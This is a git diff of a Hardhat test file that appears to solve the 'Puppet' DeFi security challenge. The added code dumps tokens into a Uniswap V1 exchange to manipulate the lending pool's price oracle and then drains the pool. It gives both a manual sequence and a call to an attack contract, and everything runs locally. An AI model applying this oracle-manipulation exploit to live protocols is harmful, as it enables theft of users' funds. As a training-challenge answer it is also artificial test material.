@@ -23,12 +23,12 @@ describe('[Challenge] Puppet', function () {
     const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n;
 
     before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
+        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, player] = await ethers.getSigners();
 
         const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
         const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);
-        
+
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
         expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE);
 
@@ -52,7 +52,7 @@ describe('[Challenge] Puppet', function () {
             token.address,
             uniswapExchange.address
         );
-    
+
         // Add initial token and ETH liquidity to the pool
         await token.approve(
             uniswapExchange.address,
@@ -64,7 +64,7 @@ describe('[Challenge] Puppet', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
         );
-        
+
         // Ensure Uniswap exchange is working as expected
         expect(
             await uniswapExchange.getTokenToEthInputPrice(
@@ -78,7 +78,7 @@ describe('[Challenge] Puppet', function () {
                 UNISWAP_INITIAL_ETH_RESERVE
             )
         );
-        
+
         // Setup initial token balances of pool and player accounts
         await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE);
         await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);
@@ -95,13 +95,39 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("Player ETH balance: ", await ethers.provider.getBalance(player.address));
+        console.log("Player DVT balance: ", await token.balanceOf(player.address));
+        const PLAYER_SWAP_AMOUNT = 9n * 10n ** 18n;
+
+        /** MANUEL SOLUTION */
+        // await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        // const deadline = (await ethers.provider.getBlock('latest')).timestamp * 2;
+        // await uniswapExchange.connect(player).tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, PLAYER_SWAP_AMOUNT, deadline);
+        // console.log("Player ETH balance AFTER swap: ", await ethers.provider.getBalance(player.address));
+        // console.log("Player DVT balance AFTER swap: ", await token.balanceOf(player.address));
+
+        // console.log("PuppetPool Deposit Required: ", await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE));
+        // await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE, player.address, { value: 20n * 10n ** 18n });
+        // console.log("Player ETH ending balance: ", await ethers.provider.getBalance(player.address));
+        // console.log("Player DVT ending balance: ", await token.balanceOf(player.address));
+
+        /** SMART CONTRACT SOLUTION (in 1-2 Tx) */
+        attacker = await (await ethers.getContractFactory('PuppetPoolAttack', deployer)).deploy(
+            lendingPool.address,
+            player.address
+        );
+        await token.connect(player).transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
+        await attacker.launchAttack(PLAYER_INITIAL_TOKEN_BALANCE, PLAYER_SWAP_AMOUNT, { value: 20n * 10n ** 18n }); // impossible IRL because the eth sent to the PuppetPoolAttack contract should be comming from the player's wallet
+        console.log("Player ETH ending balance: ", await ethers.provider.getBalance(player.address));
+        console.log("Player DVT ending balance: ", await token.balanceOf(player.address));
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
         // Player executed a single transaction
         expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);
-        
+
         // Player has taken all tokens from the pool       
         expect(
             await token.balanceOf(lendingPool.address)
